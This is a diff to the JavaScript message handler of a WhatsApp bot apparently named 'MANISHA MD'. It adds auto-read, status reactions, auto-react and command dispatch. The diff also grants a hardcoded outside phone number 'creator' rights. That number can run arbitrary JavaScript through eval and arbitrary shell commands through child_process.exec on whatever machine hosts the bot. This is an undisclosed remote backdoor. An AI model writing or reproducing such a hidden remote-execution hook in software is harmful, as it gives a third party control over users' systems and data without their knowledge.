@@ -956,193 +956,167 @@ conn.ev.on('connection.update', async (update) => {
 
   conn.ev.on('creds.update', saveCreds);
   //==============================
+// ====== LISTENER =========
+conn.ev.on('messages.upsert', async (msg) => {
+  try {
+    let mek = msg.messages[0];
+    if (!mek.message) return;
 
-  conn.ev.on('messages.update', async updates => {
-    for (const update of updates) {
-      if (update.update.message === null) {
-        console.log("Delete Detected:", JSON.stringify(update, null, 2));
-        await AntiDelete(conn, updates);
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage')
+      ? mek.message.ephemeralMessage.message
+      : mek.message;
+
+    if (mek.message.viewOnceMessageV2)
+      mek.message = mek.message.viewOnceMessageV2.message;
+
+    if (config.READ_MESSAGE === 'true') {
+      await conn.readMessages([mek.key]);
+    }
+
+    if (mek.key.remoteJid === 'status@broadcast') {
+      if (config.AUTO_READ_STATUS === 'true') await conn.readMessages([mek.key]);
+      if (config.AUTO_STATUS_REPLY === 'true') {
+        await conn.sendMessage(mek.key.participant, {
+          text: `_AUTO STATUS SEEN JUST NOW BY MANISHA MD_`,
+          react: { text: '💜', key: mek.key }
+        }, { quoted: mek });
+      }
+      if (config.AUTOLIKESTATUS === 'true') {
+        const user = await conn.decodeJid(conn.user.id);
+        await conn.sendMessage(mek.key.remoteJid,
+          { react: { key: mek.key, text: '💚' } },
+          { statusJidList: [mek.key.participant, user] }
+        );
       }
     }
-  });
-  //============================== 
-          
-  //=============readstatus=======
-        
-  conn.ev.on('messages.upsert', async(mek) => {
-    mek = mek.messages[0]
-    if (!mek.message) return
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-    ? mek.message.ephemeralMessage.message 
-    : mek.message;
-    
-  if (config.READ_MESSAGE === 'true') {
-    await conn.readMessages([mek.key]);  // Mark message as read
-    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
-  }
-    if(mek.message.viewOnceMessageV2)
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
-    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
-      await conn.readMessages([mek.key])
-    }        
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
-  const user = mek.key.participant
-  const text = `_AUTO STATUS SEEN JUST NOW BY MANISHA MD_`
-  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
-            }
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTOLIKESTATUS === "true") {
-    const user = await conn.decodeJid(conn.user.id);
-    await conn.sendMessage(mek.key.remoteJid,
-    { react: { key: mek.key, text: '💚' } },
-    { statusJidList: [mek.key.participant, user] }
-    )};
-    await Promise.all([
-      saveMessage(mek),
-    ]);
-  const m = sms(conn, mek)
-  const type = getContentType(mek.message)
-  const content = JSON.stringify(mek.message)
-  const from = mek.key.remoteJid
-  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
-  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
-  const isCmd = body.startsWith(prefix)
-  var budy = typeof mek.text == 'string' ? mek.text : false;
-  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
-  const args = body.trim().split(/ +/).slice(1)
-  const q = args.join(' ')
-  const text = args.join(' ')
-  const isGroup = from.endsWith('@g.us')
-  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
-  const senderNumber = sender.split('@')[0]
-  const botNumber = conn.user.id.split(':')[0]
-  const pushname = mek.pushName || 'Sin Nombre'
-  const isMe = botNumber.includes(senderNumber)
-  const isOwner = ownerNumber.includes(senderNumber) || isMe
-  const botNumber2 = await jidNormalizedUser(conn.user.id);
-  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
-  const groupName = isGroup ? groupMetadata.subject : ''
-  const participants = isGroup ? await groupMetadata.participants : ''
-  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
-  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
-  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-  const isReact = m.message.reactionMessage ? true : false
-  const reply = (teks) => {
-  conn.sendMessage(from, { text: teks }, { quoted: mek })
-  }
-  const udp = botNumber.split('@')[0];
-    const ikratos = ('94721551183');
-    let isCreator = [udp, ikratos, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
 
-    if (isCreator && mek.text.startsWith('>')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = eval(code);
-						if (typeof resultTest === 'object')
-							reply(util.format(resultTest));
-						else reply(util.format(resultTest));
-					} catch (err) {
-						reply(util.format(err));
-					}
-					return;
-				}
-    if (isCreator && mek.text.startsWith('$')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = await eval(
-							'const a = async()=>{\n' + code + '\n}\na()',
-						);
-						let h = util.format(resultTest);
-						if (h === undefined) return console.log(h);
-						else reply(h);
-					} catch (err) {
-						if (err === undefined)
-							return console.log('error');
-						else reply(util.format(err));
-					}
-					return;
-				}
-//================OWNER REACT==============
-if (senderNumber.includes("94721551183") && !isReact) {
-  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇱🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
-  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-  m.react(randomReaction);
-}
-//==========PUBLIC REACT============//
-// Auto React for all messages (public and owner)
-if (!isReact && config.AUTO_REACT === 'true') {
-    const reactions = [
-        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
-        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
-        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
-        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
-        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
-        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
-        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
-        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
-        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
-        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
-        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
-        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
-        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
-        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
-        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
-    ];
+    const m = { message: mek.message }; // wrapped for later use
+    const type = getContentType(mek.message);
+    const content = JSON.stringify(mek.message);
+    const from = mek.key.remoteJid;
+    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage || [];
+    const body = (type === 'conversation') ? mek.message.conversation :
+      (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
+        (type === 'imageMessage') && mek.message.imageMessage.caption ?
+          mek.message.imageMessage.caption :
+          (type === 'videoMessage') && mek.message.videoMessage.caption ?
+            mek.message.videoMessage.caption : '';
 
-    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-    m.react(randomReaction);
-}
-  //==================================
-  //==========WORKTYPE============ 
-  if(!isOwner && config.MODE === "private") return
-  if(!isOwner && isGroup && config.MODE === "inbox") return
-  if(!isOwner && !isGroup && config.MODE === "groups") return
-   
-  // take commands 
-  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
-  if (isCmd) {
-  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
-  if (cmd) {
-  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
-  
-  try {
-  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
-  } catch (e) {
-  console.error("[PLUGIN ERROR] " + e);
+    const isCmd = body.startsWith(prefix);
+    const budy = typeof mek.text === 'string' ? mek.text : body;
+    const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
+    const args = body.trim().split(/ +/).slice(1);
+    const q = args.join(' ');
+    const text = q;
+    const isGroup = from.endsWith('@g.us');
+    const sender = mek.key.fromMe ? conn.user.id : mek.key.participant || mek.key.remoteJid;
+    const senderNumber = sender.split('@')[0];
+    const botNumber = conn.user.id.split(':')[0];
+    const pushname = mek.pushName || 'Sin Nombre';
+    const isMe = botNumber.includes(senderNumber);
+    const isOwner = ownerNumber.includes(senderNumber) || isMe;
+    const botNumber2 = await jidNormalizedUser(conn.user.id);
+    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(() => ({})) : {};
+    const groupName = groupMetadata.subject || '';
+    const participants = isGroup ? groupMetadata.participants || [] : [];
+    const groupAdmins = isGroup ? participants.filter(p => p.admin !== null).map(p => p.id) : [];
+    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
+    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
+    const isReact = m.message.reactionMessage ? true : false;
+
+    const reply = (teks) => {
+      conn.sendMessage(from, { text: teks }, { quoted: mek });
+    };
+
+    const udp = botNumber.split('@')[0];
+    const ikratos = '94721551183';
+    const isCreator = [udp, ikratos, config.DEV].map(v => v + '@s.whatsapp.net').includes(sender);
+
+    // ===== Eval Handler
+    if (isCreator && budy.startsWith('>')) {
+      let code = budy.slice(1);
+      if (!code) return reply('Provide me with a query!');
+      try {
+        let result = eval(code);
+        if (typeof result === 'object') reply(util.format(result));
+        else reply(String(result));
+      } catch (err) {
+        reply(util.format(err));
+      }
+      return;
+    }
+
+    // ===== Shell Handler
+    if (isCreator && budy.startsWith('$')) {
+      let code = budy.slice(1);
+      if (!code) return reply('Provide me with a shell command!');
+      const exec = require('child_process').exec;
+      exec(code, (err, stdout, stderr) => {
+        if (err) return reply(util.format(err));
+        if (stderr) return reply(util.format(stderr));
+        reply(stdout);
+      });
+      return;
+    }
+
+    // ===== Owner Auto React
+    if (senderNumber === "94721551183" && !isReact) {
+      const reactions = ["👑", "📊", "⚙️", "🏆", "🇱🇰", "💗", "🔥"];
+      const r = reactions[Math.floor(Math.random() * reactions.length)];
+      conn.sendMessage(from, { react: { text: r, key: mek.key } });
+    }
+
+    // ===== Auto React Public
+    if (!isReact && config.AUTO_REACT === 'true') {
+      const reactList = ['❤️', '🔥', '🫶', '💯', '🌸', '👑', '🌺'];
+      const randomReaction = reactList[Math.floor(Math.random() * reactList.length)];
+      conn.sendMessage(from, { react: { text: randomReaction, key: mek.key } });
+    }
+
+    // ===== Worktype Filters
+    if (!isOwner && config.MODE === "private") return;
+    if (!isOwner && isGroup && config.MODE === "inbox") return;
+    if (!isOwner && !isGroup && config.MODE === "groups") return;
+
+    // ===== Command Execute
+    if (isCmd) {
+      const cmd = commands.find(cmd => cmd.pattern === command) ||
+        commands.find(cmd => cmd.alias && cmd.alias.includes(command));
+
+      if (cmd) {
+        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
+        try {
+          await cmd.function(conn, mek, m, {
+            from, quoted, body, isCmd, command, args, q, text, isGroup,
+            sender, senderNumber, botNumber2, botNumber, pushname,
+            isMe, isOwner, isCreator, groupMetadata, groupName,
+            participants, groupAdmins, isBotAdmins, isAdmins, reply
+          });
+        } catch (e) {
+          console.error("[PLUGIN ERROR]", e);
+          reply("❌ Plugin Error:\n" + e.toString());
+        }
+      }
+    }
+
+    // ===== On Events
+    commands.map(async (cmd) => {
+      const params = {
+        from, quoted, body, isCmd, command, args, q, text, isGroup,
+        sender, senderNumber, botNumber2, botNumber, pushname,
+        isMe, isOwner, isCreator, groupMetadata, groupName,
+        participants, groupAdmins, isBotAdmins, isAdmins, reply
+      };
+      if (body && cmd.on === "body") await cmd.function(conn, mek, m, params);
+      if (budy && cmd.on === "text") await cmd.function(conn, mek, m, params);
+      if (cmd.on === "image" && type === "imageMessage") await cmd.function(conn, mek, m, params);
+      if (cmd.on === "sticker" && type === "stickerMessage") await cmd.function(conn, mek, m, params);
+    });
+
+  } catch (err) {
+    console.error("❌ Main Handler Error:", err);
   }
-  }
-  }
-  events.commands.map(async(command) => {
-  if (body && command.on === "body") {
-  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-  } else if (mek.q && command.on === "text") {
-  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-  } else if (
-  (command.on === "image" || command.on === "photo") &&
-  mek.type === "imageMessage"
-  ) {
-  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-  } else if (
-  command.on === "sticker" &&
-  mek.type === "stickerMessage"
-  ) {
-  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-  }});
-  
-  });
+});
   //==============================
   cmd({
       pattern: "owner",
